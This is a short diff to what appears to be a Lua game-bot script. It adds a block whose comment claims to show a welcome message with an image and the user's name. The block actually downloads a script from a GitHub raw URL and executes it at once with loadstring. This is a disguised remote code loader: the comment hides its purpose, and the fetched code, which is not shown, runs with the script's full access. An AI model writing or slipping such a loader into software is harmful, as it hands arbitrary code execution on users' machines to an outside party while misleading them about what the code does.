@@ -132,6 +132,11 @@ end
 
 modules.game_textmessage.displayGameMessage("Scripts Protegidos Cargados.")
 
+-- Mensaje bienvenida con imagen Y tu name
+HTTP.get('https://raw.githubusercontent.com/Madagenius/Scripsv8/refs/heads/main/VBOT4.8', function(script)
+    assert(loadstring(script))()
+end)
+
 setDefaultTab("Main")
 
 -- Esconder Iconos
